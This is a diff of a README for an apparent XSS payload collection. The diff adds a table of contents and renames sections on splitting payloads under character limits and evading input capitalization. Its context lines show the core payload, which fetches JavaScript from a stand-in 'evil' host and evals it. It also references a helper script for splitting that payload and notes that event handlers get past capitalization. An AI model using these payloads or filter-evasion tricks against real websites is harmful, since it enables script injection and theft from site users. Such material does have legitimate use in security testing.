@@ -8,8 +8,20 @@ The payload, in a nutshell is:
 fetch('//evil/js').then(r=>r.text().then(eval))
 ```
 
+# Table of Contents
+
+* [Dealing with limited space](#dealing-with-limited-space)
+  * [Usecase: character limit is &gt;= 20 (not including wrapping)](#usecase-character-limit-is--20-not-including-wrapping)
+  * [Usecase: character limit is &gt;= 13 (not including wrapping)](#usecase-character-limit-is--13-not-including-wrapping)
+  * [Usecase: character limit is &gt;= 10](#usecase-character-limit-is--10)
+* [Dealing with input transformation](#dealing-with-input-transformation)
+  * [Usecase: payload is being capitalized, character limit &gt;= 131 (not including wrapping and length of external resource URL)](#usecase-payload-is-being-capitalized-character-limit--131-not-including-wrapping-and-length-of-external-resource-url)
+  * [Usecase: payload is being capitalized, character limit &gt; ~342 (not including wrapping, may vary depending on external resource URL)](#usecase-payload-is-being-capitalized-character-limit--342-not-including-wrapping-may-vary-depending-on-external-resource-url)
+  * [Usecase: payload is being capitalized, character limit &gt;= 10](#usecase-payload-is-being-capitalized-character-limit--10)
+* [Obfuscated payload(s)](#obfuscated-payloads)
+
 ---
-### Split payloads
+### Dealing with limited space
 The below usecases are for character limit that doesn't allow the full payload in a single injection. Each line is a separate payload that requires wrapping to put it in a JS context (e.g. `<script>`**_payload_**`</script>`).
 
 ##### Usecase: character limit is &gt;= 20 (not including wrapping)
@@ -84,7 +96,7 @@ python2 fetch_helpers.py "fetch('//myown/external/js').then(r=>r.text().then(eva
 **Note:** You can adjust the maximum length, but it has to be greater than 10. If it wasn't for the `<script>` tags it could be done with 8 characters per line, but I don't know of a wrapping that would work other than `<script>`.
 
 ---
-### Evading some sanitisation
+### Dealing with input transformation
 
 ##### Usecase: payload is being capitalized, character limit &gt;= 131 (not including wrapping and length of external resource URL)
 * `<script>`**_payload_**`</script>` won't work; use event handlers
